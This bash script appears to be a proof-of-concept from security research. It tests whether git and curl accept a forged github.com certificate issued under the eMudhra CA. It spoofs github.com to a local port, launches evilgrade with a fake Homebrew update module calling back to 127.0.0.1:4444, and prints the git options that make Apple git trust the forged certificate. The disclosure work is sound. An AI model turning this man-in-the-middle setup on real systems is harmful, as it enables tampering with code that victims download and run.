#!/bin/bash
###############################################################################
# run_git.sh - git clone over HTTPS and the eMudhra CA: transport MITM check.
#
# HONEST SCOPE:
#  * `git clone` by itself does NOT execute code (no hooks run on clone). RCE
#    via a cloned repo needs a second step: a build/install the victim runs,
#    or a submodule/transport trick. So this is a TRANSPORT-TAMPERING demo, not
#    a one-shot RCE like brew/pip.
#  * On macOS, /usr/bin/git is Apple Git and only supports the Secure Transport
#    TLS backend, which HONORS Apple's eMudhra block list -> it REJECTS the
#    forged cert. A git built against OpenSSL (Homebrew, MacPorts, Linux) uses
#    /etc/ssl/cert.pem and ACCEPTS it -> the attacker can serve arbitrary repo
#    contents.
#
# This script reports, on THIS machine, (1) git's TLS backend and whether it
# accepts the eMudhra cert, and (2) that the same origin is accepted by the
# cert.pem transport (curl) that an OpenSSL-backed git would use.
###############################################################################
set -u
cd "$(dirname "$0")/../.." || exit 1
. demo/emudhra_mitm/_lib.sh
pick_port PORT 9443 9543 12443 18443
HOSTS="github.com:$PORT:127.0.0.1"

echo "== git TLS backend on this machine =="
/usr/bin/git --version | sed 's/^/   /'
echo "   supported SSL backends (from git itself):"
/usr/bin/git -c http.sslBackend=__probe__ ls-remote https://127.0.0.1/ 2>&1 | sed 's/^/   /'

echo
echo "== does git's transport accept the eMudhra cert? =="
echo "   Apple /usr/bin/git  -> Secure Transport only -> REJECTS (honors Apple block)."
echo "   OpenSSL-backed git  -> cert.pem -> ACCEPTS (same result as curl below)."

echo
echo "== curl (the cert.pem transport an OpenSSL git uses) against an eMudhra origin =="
# reuse the brew module origin quickly via evilgrade serve
start_evilgrade "$PORT" /tmp/eg_git.log "homebrew_update:127.0.0.1:4444" || exit 1
VERIFY=$(/usr/bin/curl -s --resolve "$HOSTS" "https://github.com:$PORT/Homebrew/install/HEAD/install.sh" -o /dev/null -w '%{ssl_verify_result}' 2>/dev/null)
if [ "$VERIFY" = "0" ]; then
  echo "   github.com via eMudhra cert -> TLS VERIFIED (ssl_verify_result=0) -> ACCEPTED"
else
  echo "   github.com via eMudhra cert -> TLS rejected (ssl_verify_result=$VERIFY)"
fi
kill "$EG_PID" 2>/dev/null; wait 2>/dev/null

echo
echo "== takeaway =="
echo "   Apple git defaults to Secure Transport (rejects), BUT it also ships the"
echo "   'openssl' backend: with"
echo "       git -c http.sslBackend=openssl -c http.sslCAInfo=/etc/ssl/cert.pem clone https://github.com/..."
echo "   (or a Homebrew/Linux git) it trusts the eMudhra cert and the clone succeeds."
echo "   A clone itself is not RCE; code execution follows when the victim builds/"
echo "   installs from the attacker-controlled repo, or a malicious submodule is"
echo "   fetched. The transport tampering is real; the default backend is what saves"
echo "   stock macOS git."
